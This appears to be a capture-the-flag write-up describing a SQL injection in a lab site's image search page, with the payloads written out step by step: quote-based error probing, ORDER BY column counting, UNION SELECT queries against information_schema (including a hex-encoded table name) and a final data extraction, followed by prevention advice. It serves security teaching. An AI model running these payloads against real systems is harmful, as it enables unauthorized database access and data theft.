# SQL Injection

## Description

This challenge is another instance of **SQL Injection (SQLi)**, similar to the previous member‑search vulnerability. The image search feature at `searchimg` takes user input and embeds it directly into a SQL query without sanitization or parameterization. This allows an attacker to enumerate the database and extract data from the database.

## How to Get the Flag

* Visit:

  ```
  http://localhost/?page=searchimg
  ```
* Entering a single quote (`'`) triggers a SQL error, confirming that the input is injected directly into the backend query.

### Determine the Number of Columns

Use the `ORDER BY` technique:

```
1 ORDER BY 1
1 ORDER BY 2
1 ORDER BY 3
...
```

When an error appears at `N`, the query contains **N‑1 columns**.

### Map Columns to the Page Output

Inject a UNION query to see how returned columns are rendered:

```
-1 UNION SELECT 1,2
```

This reveals how column positions relate to the displayed data.

### Get the table names of the current database

```sql
-1 UNION SELECT 1, table_name FROM information_schema.tables WHERE table_schema = DATABASE();
```

From this, we find a table named `list_images`.


### Extract Columns Dynamically

To retrieve the column names:

```sql
-1 UNION SELECT 1, column_name FROM information_schema.columns
WHERE table_name = 0x6c6973745f696d61676573 AND table_schema = DATABASE();
```

(`list_images` encoded in hex → `0x6c6973745f696d61676573`)

### Extract Data from the Table

Once the columns are confirmed, query them directly:

```sql
-1 UNION SELECT title, comment FROM list_images
```

Inside the retrieved data, one of the values reveals the **flag**.

## Vulnerability Explanation

* User input is concatenated directly into a SQL query.
* No sanitization or parameterized queries are used.
* Attackers can modify the structure of the query and retrieve arbitrary information.

## Prevention of Vulnerability

* Always use prepared statements / parameterized queries.
* Validate and sanitize all user input.
* Hide SQL errors from the user to avoid leaking query structure.
* Apply least‑privilege principles to the database user.
